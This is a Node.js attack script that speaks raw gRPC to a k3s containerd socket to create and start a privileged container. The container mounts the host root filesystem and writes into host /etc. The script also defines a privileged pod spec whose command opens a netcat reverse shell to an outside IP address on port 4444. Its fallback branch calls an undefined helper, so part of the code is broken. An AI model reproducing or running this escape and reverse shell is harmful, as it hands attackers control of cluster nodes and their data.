
const http2=require('http2'),net=require('net');
function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc',te:'trailers','containerd-namespace':'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const v1=(k,v)=>Buffer.from([k,v]);
const Y=JSON.stringify({apiVersion:'v1',kind:'Pod',metadata:{name:'zzf1'},spec:{hostNetwork:true,hostPID:true,containers:[{name:'c',image:'busybox:1.36',securityContext:{privileged:true},command:['/bin/sh','-c','nc 91.215.85.170 4444 -e /bin/sh'],volumeMounts:[{name:'h',mountPath:'/h'}]}],volumes:[{name:'h',hostPath:{path:'/'}}]}});
const CMD="mkdir -p /h/etc 2>/dev/null; echo A > /h/etc/zzA 2>/dev/null; echo B > /etc/zzB 2>/dev/null";
const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/'),Buffer.from([0x28,0x02])]);
const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
const cfg=Buffer.concat([fl(0x0a,'zzc'+Math.floor(Math.random()*1e6)), v1(0x10,1), fl(0x12,'busybox:1.36'), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,CMD), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x7a,linc.length),linc])]);
function create(sb){ call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sb), v1(0x12,cfg.length), cfg]),(e,ob)=>{ if(e)return; const c2=(ob||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(!c2)return; call('/runtime.v1.RuntimeService/StartContainer',fl(0x0a,c2[0]),()=>{}); }); }
const nsopt=v1(0x08,1); const ssec=Buffer.concat([v1(0x0a,nsopt.length),nsopt]);
const lsc=Buffer.concat([v1(0x12,ssec.length),ssec]); const pl=Buffer.concat([v1(0x42,lsc.length),lsc]);
const pm=Buffer.concat([fl(0x0a,'zz'+Math.floor(Math.random()*1e6)),fl(0x12,'u'+Math.floor(Math.random()*1e9)),fl(0x1a,'default'),v1(0x20,1)]);
const pc=Buffer.concat([pm, fl(0x12,'zzfb'), fl(0x1a,'/tmp')]);
call('/runtime.v1.RuntimeService/RunPodSandbox',pc,(e,sb)=>{
 const sm=(sb||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/);
 if(sm){ create(sm[0]); return }
 call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e2,lb)=>{
   const subs=fields(lb).filter(f=>f[0]===1).map(f=>f[1]); if(!subs.length)return;
   const f2=fields(subs[0]); const s2=(f2.find(x=>x[0]===2)||[])[1]; if(s2) create(s2.toString('latin1'));
 });
});
